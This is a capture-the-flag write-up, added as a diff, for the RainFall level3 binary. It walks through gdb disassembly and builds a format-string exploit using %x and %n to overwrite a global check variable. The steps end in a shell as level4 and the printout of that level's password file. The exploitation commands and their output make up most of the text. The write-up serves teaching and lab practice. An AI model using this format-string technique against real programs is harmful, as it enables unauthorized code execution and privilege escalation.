@@ -1,0 +1,153 @@
+# We have a executable "level3" lets do some test!
+
+>level3@RainFall:~$ ./level3 
+test
+test
+>level3@RainFall:~$ ./level3 
+test test
+test test
+>level3@RainFall:~$
+
+# This program don't take argument, read stdin and display what we have write.
+
+# Let's use gdb to investigate
+
+>level3@RainFall:~$ gdb level3
+(gdb)disas main
+[...]
+   0x0804851a <+0>:	push   %ebp
+   0x0804851b <+1>:	mov    %esp,%ebp
+   0x0804851d <+3>:	and    $0xfffffff0,%esp
+   0x08048520 <+6>:	call   0x80484a4 <v>
+[...]
+
+# The main call a the v function let's dissamble it to
+
+(gdb) disas v
+[...]
+   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
+   0x080484cc <+40>:	lea    -0x208(%ebp),%eax
+   0x080484d2 <+46>:	mov    %eax,(%esp)
+   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
+[...]
+
+# So it call fgets and printf the return of it
+
+[...]
+   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
+   0x0804850c <+104>:	movl   $0x804860d,(%esp)
+   0x08048513 <+111>:	call   0x80483c0 <system@plt>
+[...]
+
+# Later we can see it make a system call maybe a /bin/sh?
+
+[...]
+   0x080484da <+54>:	mov    0x804988c,%eax
+   0x080484df <+59>:	cmp    $0x40,%eax
+   0x080484e2 <+62>:	jne    0x8048518 <v+116>
+[...]
+
+# But for this to happen we must pass trough this cmp, so our objectif is to match eax value to 0x40 (64 in decimal)
+
+# So we must change the value at the address of 0x804988c to 0x40
+
+# And as we have seen earlier printf only print the return of fgets so we can use a format string exploit !
+
+# Let's do some test
+
+(gdb) r
+Starting program: /home/user/level3/level3 
+test
+test
+[Inferior 1 (process 2838) exited normally]
+(gdb) r
+Starting program: /home/user/level3/level3 
+%s%s%s
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7e70a6a in vfprintf () from /lib/i386-linux-gnu/libc.so.6
+
+# See we can influence the printf behavior with how it manage the string!
+
+(gdb) r
+Starting program: /home/user/level3/level3 
+%x.%x.%x.
+200.b7fd1ac0.b7ff37d0.
+[Inferior 1 (process 2853) exited normally]
+
+# With %x we can print the stack of the program! And so influence it later with %n
+
+# But now we must find how much do we need of %x to arrive at an address we can modify
+
+(gdb) r
+Starting program: /home/user/level3/level3 
+AAAA%x.%x.%x.%x.%x.
+AAAA200.b7fd1ac0.b7ff37d0.41414141.252e7825.
+
+# We can see the AAAA hexa value at the fourth %x, so now we can change the fourth address to the address we want to access and change its value
+
+# For that we will make a breakpoint to verify its value before and after the printf
+
+(gdb) b *0x080484d5
+Breakpoint 1 at 0x80484d5
+(gdb) b *0x080484da
+Breakpoint 2 at 0x80484da
+
+# Let's run the program
+
+(gdb) r <<< $(python -c "print('\x8c\x98\x04\x08' + '%x.%x.%x.%n')")
+Starting program: /home/user/level3/level3 <<< $(python -c "print('\x8c\x98\x04\x08' + '%x.%x.%x.%n')")
+
+Breakpoint 1, 0x080484d5 in v ()
+(gdb) x 0x804988c
+0x804988c <m>:	0x00000000
+(gdb) continue
+Continuing.
+�200.b7fd1ac0.b7ff37d0.
+
+Breakpoint 2, 0x080484da in v ()
+(gdb) x 0x804988c
+0x804988c <m>:	0x0000001a
+
+# It worked! Now we must match with 0x40. 0x1a is 26 in decimal so 64 - 26 = 38
+
+# So let's add 38 and see if it work
+
+(gdb) r <<< $(python -c "print('\x8c\x98\x04\x08' + '%x.%x.%38x.%n')")
+Starting program: /home/user/level3/level3 <<< $(python -c "print('\x8c\x98\x04\x08' + '%x.%x.%38x.%n')")
+
+Breakpoint 1, 0x080484d5 in v ()
+(gdb) continue
+Continuing.
+�200.b7fd1ac0.                              b7ff37d0.
+
+Breakpoint 2, 0x080484da in v ()
+(gdb) x 0x804988c
+0x804988c <m>:	0x00000038
+
+# Ah 8 it's missing to reach 0x40
+
+(gdb) r <<< $(python -c "print('\x8c\x98\x04\x08' + '%x.%x.%46x.%n')")
+Starting program: /home/user/level3/level3 <<< $(python -c "print('\x8c\x98\x04\x08' + '%x.%x.%46x.%n')")
+
+Breakpoint 1, 0x080484d5 in v ()
+(gdb) continue
+Continuing.
+�200.b7fd1ac0.                                      b7ff37d0.
+
+Breakpoint 2, 0x080484da in v ()
+(gdb) x 0x804988c
+0x804988c <m>:	0x00000040
+
+# Done now let's try it outside gdb
+
+>level3@RainFall:~$ python -c "print('\x8c\x98\x04\x08' + '%x.%x.%46x.%n')" > /tmp/test
+>level3@RainFall:~$ cat /tmp/test - | ./level3
+�200.b7fd1ac0.                                      b7ff37d0.
+Wait what?!
+whoami
+level4
+cd ..
+cd level4
+cat .pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
